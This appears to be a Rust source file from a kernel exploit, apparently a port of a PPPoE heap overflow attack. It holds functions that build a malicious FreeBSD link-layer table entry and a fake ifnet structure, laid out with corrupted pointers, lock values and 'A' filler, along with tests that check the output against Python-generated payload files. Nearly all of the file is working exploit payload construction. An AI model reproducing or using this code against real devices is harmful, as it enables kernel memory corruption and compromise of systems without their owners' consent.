use crate::constants;

/// Creates the Link-Layer Entry
/// The LLE (link layer entry) table stores information about hosts on a network
/// and is used to translate between network layer addresses and data link layer
/// addresses. This is a malicious entry for it.
/// The link layer entry struct is defined in the FreeBSD kernel
/// `freebsd-src/sys/net/if_llatbl.h`
pub fn build_overflow_lle(pppoe_softc: u64) -> Vec<u8> {
    let mut overflow_lle = Vec::new();

    // lle_next
    overflow_lle.extend(&(pppoe_softc + constants::PPPOE_SOFTC_SC_AC_COOKIE).to_le_bytes()); // le_next
    overflow_lle.extend(&constants::ZERO.to_le_bytes()); // le_prev

    // lle_lock
    overflow_lle.extend(&constants::ZERO.to_le_bytes()); // lo_name
    overflow_lle.extend(&(constants::RW_INIT_FLAGS | constants::LO_DUPOK).to_le_bytes()); // lo_flags
    overflow_lle.extend(&0u32.to_le_bytes()); // lo_data
    overflow_lle.extend(&constants::ZERO.to_le_bytes()); // lo_witness
    overflow_lle.extend(&constants::RW_UNLOCKED.to_le_bytes()); // rw_lock

    // lle_tbl
    overflow_lle.extend(
        &(pppoe_softc + constants::PPPOE_SOFTC_SC_AC_COOKIE - constants::LLTABLE_LLTIFP)
            .to_le_bytes(),
    ); // lle_tbl
    overflow_lle.extend(&constants::ZERO.to_le_bytes()); // lle_head
    overflow_lle.extend(&constants::ZERO.to_le_bytes()); // lle_free
    overflow_lle.extend(&constants::ZERO.to_le_bytes()); // la_hold
    overflow_lle.extend(&0u32.to_le_bytes()); // la_numheld
    overflow_lle.extend(&0u32.to_le_bytes()); // pad
    overflow_lle.extend(&0u64.to_le_bytes()); // la_expire

    // la_flags and remaining fields
    overflow_lle.extend(&constants::LLE_EXCLUSIVE.to_le_bytes()); // la_flags
    overflow_lle.extend(&0u16.to_le_bytes()); // la_asked
    overflow_lle.extend(&0u16.to_le_bytes()); // la_preempt
    overflow_lle.extend(&0u16.to_le_bytes()); // ln_byhint
    overflow_lle.extend(&constants::ND6_LLINFO_NOSTATE.to_le_bytes()); // ln_state
    overflow_lle.extend(&0u16.to_le_bytes()); // ln_router
    overflow_lle.extend(&0u32.to_le_bytes()); // pad
    overflow_lle.extend(&0x7fffffffffffffff_u64.to_le_bytes()); // ln_ntick

    overflow_lle
}

pub fn create_fake_ifnet(pppoe_softc: u64) -> Vec<u8> {
    // Fake ifnet
    let mut fake_ifnet = vec![0x41; 0x48]; // Fill with 'A' initially
    fake_ifnet.extend(&constants::ZERO.to_le_bytes()); // if_addrhead
    fake_ifnet.resize(0x70, 0x41); // Fill to 0x70 with 'A'
    fake_ifnet.extend(&0x0001u16.to_le_bytes()); // if_index
    fake_ifnet.resize(0xa0, 0x41); // Fill to 0xa0 with 'A'
    fake_ifnet.push(constants::IFT_ETHER); // ifi_type
    fake_ifnet.push(0); // ifi_physical
    fake_ifnet.push(0x8 + 0x1); // ifi_addrlen
    fake_ifnet.resize(0x1b8, 0x41); // Fill to 0x1b8 with 'A'

    fake_ifnet.extend(&(pppoe_softc + constants::PPPOE_SOFTC_SC_DEST).to_le_bytes()); // if_addr
    fake_ifnet.resize(0x428, 0x41); // Fill to 0x428 with 'A'
    fake_ifnet.extend(&(pppoe_softc + 0x10 - 0x8).to_le_bytes()); // nd_ifinfo
                                                                  // if_afdata_lock

    fake_ifnet.resize(0x480, 0x41); // Fill to 0x480 with 'A'
    fake_ifnet.extend(&constants::ZERO.to_le_bytes()); // lo_name
    fake_ifnet.extend(&constants::RW_INIT_FLAGS.to_le_bytes()); // lo_flags
    fake_ifnet.extend(&0u32.to_le_bytes()); // lo_data
    fake_ifnet.extend(&constants::ZERO.to_le_bytes()); // lo_witness
    fake_ifnet.extend(&constants::RW_UNLOCKED.to_le_bytes()); // rw_lock
                                                              // if_addr_mtx

    fake_ifnet.resize(0x4c0, 0x41); // Fill to 0x4c0 with 'A'

    fake_ifnet.extend(&constants::ZERO.to_le_bytes()); // lo_name
    fake_ifnet.extend(&constants::MTX_INIT_FLAGS.to_le_bytes()); // lo_flags
    fake_ifnet.extend(&0u32.to_le_bytes()); // lo_data
    fake_ifnet.extend(&constants::ZERO.to_le_bytes()); // lo_witness
    fake_ifnet.extend(&constants::MTX_UNOWNED.to_le_bytes()); // mtx_lock
    fake_ifnet
}

#[cfg(test)]
mod tests {

    use super::*;
    use std::fs::File;
    use std::io::Read;
    use std::io::Write;
    #[test]
    fn test_fake_ifnet_comparison() {
        // Generate fake ifnet using the Rust implementation
        let pppoe_softc: u64 = 0x123456789ABCDEF0;
        let rust_fake_ifnet = create_fake_ifnet(pppoe_softc);

        // Dump the fake ifnet to a file
        let mut rust_file =
            File::create("test_data/rust_fake_ifnet.bin").expect("Failed to create file");
        rust_file
            .write_all(&rust_fake_ifnet)
            .expect("Failed to write to file");

        // Load the fake ifnet generated by Python
        let mut python_fake_ifnet = Vec::new();
        let mut python_file =
            File::open("test_data/fake_ifnet.bin").expect("Failed to open Python fake ifnet file");
        python_file
            .read_to_end(&mut python_fake_ifnet)
            .expect("Failed to read Python fake ifnet file");

        // Compare the lengths of the two files
        assert_eq!(
            rust_fake_ifnet.len(),
            python_fake_ifnet.len(),
            "File lengths are not equal"
        );

        // Compare the contents of the two files byte by byte
        for (idx, (rust_byte, python_byte)) in rust_fake_ifnet
            .iter()
            .zip(python_fake_ifnet.iter())
            .enumerate()
        {
            assert_eq!(rust_byte, python_byte, "Byte mismatch at index {}", idx);
        }
    }

    #[test]
    fn test_overflow_lle_comparison() {
        // Generate malicious LLE using the Rust implementation
        let pppoe_softc: u64 = 0xffffea374898a600; // Initial pppoe
        let rust_overflow_lle = build_overflow_lle(pppoe_softc);

        // Dump the malicious LLE to a file
        let mut rust_file =
            File::create("test_data/rust_overflow_lle.bin").expect("Failed to create file");
        rust_file
            .write_all(&rust_overflow_lle)
            .expect("Failed to write to file");

        // Load the malicious LLE generated by Python
        let mut python_overflow_lle = Vec::new();
        let mut python_file =
            File::open("test_data/overflow_lle.bin").expect("Failed to open Python LLE file");
        python_file
            .read_to_end(&mut python_overflow_lle)
            .expect("Failed to read Python LLE file");

        // Compare the lengths of the two files
        assert_eq!(
            rust_overflow_lle.len(),
            python_overflow_lle.len(),
            "File lengths are not equal"
        );

        // Compare the contents of the two files byte by byte
        for (idx, (rust_byte, python_byte)) in rust_overflow_lle
            .iter()
            .zip(python_overflow_lle.iter())
            .enumerate()
        {
            assert_eq!(rust_byte, python_byte, "Byte mismatch at index {}", idx);
        }
    }
}
